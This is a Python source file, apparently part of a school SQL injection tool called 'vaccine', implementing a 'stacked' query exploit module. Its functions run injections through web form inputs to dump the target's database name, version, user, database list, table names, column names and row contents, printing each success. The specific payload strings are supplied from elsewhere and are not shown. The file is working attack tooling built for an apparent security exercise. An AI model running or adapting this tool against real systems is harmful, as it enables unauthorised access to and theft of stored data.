# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stacked.py                                         :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: luzog78 <luzog78@gmail.com>                +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/12/15 18:52:28 by luzog78           #+#    #+#              #
#    Updated: 2025/12/16 19:02:50 by luzog78          ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from typing import Any

from exploits import Exploit
from vaccine import Database, Form, DBServer, InputField, Table, print


def stacked_exploit(
		headers: dict[str, str],
		server: DBServer,
		ignored_databases: list[str],
		payloads: dict[str, str],
		delimiter: str,
		form: Form,
		input: InputField | None,
		verbose: bool,
		) -> bool:
	inputs = [input] if input is not None else form.inputs
	for _input in inputs:
		exploit = Exploit(
			exploit_name='stacked',
			headers=headers,
			server=server,
			ignored_databases=ignored_databases,
			payloads=payloads,
			delimiter=delimiter,
			form=form,
			input=_input,
			verbose=verbose,
		)

		result = exploit.do_exploit(
			database_exploit_func=database_stacked_exploit,
			version_exploit_func=version_stacked_exploit,
			user_exploit_func=user_stacked_exploit,
			databases_exploit_func=databases_stacked_exploit,
			tables_exploit_func=tables_stacked_exploit,
			columns_exploit_func=columns_stacked_exploit,
			rows_exploit_func=rows_stacked_exploit,
		)
		if result:
			return True
	return False


def database_stacked_exploit(exploit: Exploit, payload: str) -> Database | None:
	database_name = exploit.fetch_unique(payload)
	if database_name is None:
		print('    [!] Exploit failed: Cannot retrieve current database name')
		return None

	print(f'    [+] Exploit successful: Current database name is {repr(database_name)}')
	db = exploit.server.get_db(database_name)
	if db is None:
		db = Database(name=database_name)
		exploit.server.dbs.append(db)
	return db


def version_stacked_exploit(exploit: Exploit, payload: str) -> str | None:
	version = exploit.fetch_unique(payload)
	if version is None:
		print('    [!] Exploit failed: Cannot retrieve database version')
		return None

	print(f'    [+] Exploit successful: Database version is {repr(version)}')
	exploit.server.version = version
	return version


def user_stacked_exploit(exploit: Exploit, payload: str) -> str | None:
	user = exploit.fetch_unique(payload)
	if user is None:
		print('    [!] Exploit failed: Cannot retrieve database user')
		return None

	print(f'    [+] Exploit successful: Database user is {repr(user)}')
	exploit.server.user = user
	return user


def databases_stacked_exploit(exploit: Exploit, payload: str) -> list[Database] | None:
	database_names, success = exploit.fetch(payload)
	if not success:
		print('    [!] Exploit failed: Cannot retrieve database names')
		return None

	print(f'    [+] Exploit successful: Found {len(database_names)} databases: {", ".join([repr(db) for db in database_names])}')
	databases = []
	for database_name in database_names:
		db = exploit.server.get_db(database_name)
		if db is None:
			db = Database(name=database_name)
			exploit.server.dbs.append(db)
		databases.append(db)
	return databases


def tables_stacked_exploit(exploit: Exploit, payload: str,
		database: Database) -> list[Table] | None:
	table_names, success = exploit.fetch(payload, database=database.name)
	if not success:
		print('      [!] Exploit failed: Cannot retrieve table names')
		return None

	print(f'      [+] Exploit successful: Found {len(table_names)} tables: {", ".join([repr(t) for t in table_names])}')
	tables = []
	for table_name in table_names:
		table = database.get_table(table_name)
		if table is None:
			table = Table(name=table_name)
			database.tables.append(table)
		tables.append(table)
	return tables


def columns_stacked_exploit(exploit: Exploit, payload: str,
		database: Database, table: Table) -> list[str] | None:
	columns, success = exploit.fetch(payload,
							database=database.name, table=table.name)
	if not success:
		print(f'        [!] Exploit of {repr(table.name)} failed: Cannot retrieve column names')
		return None

	print(f'        [+] Exploit of {repr(table.name)} successful: Found {len(columns)} columns: {", ".join([repr(c) for c in columns])}')
	table.columns = columns
	return columns


def rows_stacked_exploit(exploit: Exploit, payload: str, database: Database,
			table: Table, column: str, column_idx: int) -> list[str] | None:
	rows, success = exploit.fetch(payload,
						database=database.name, table=table.name, column=column)
	if not success:
		print(f'          [!] Exploit failed: Cannot retrieve rows')
		return None

	print(f'          [+] Exploit successful: Found {len(rows)} rows in {repr(table.name)}.{repr(column)}')

	table_rows_len = len(table.rows)
	table_columns_len = len(table.columns)
	for i, row in enumerate(rows):
		if i < table_rows_len:
			r = table.rows[i]
		else:
			r: list[Any] = [None] * table_columns_len
			table.rows.append(r)
		row_len = len(r)
		if row_len < table_columns_len:
			r.extend([None] * (table_columns_len - row_len))
		r[column_idx] = row
	return rows
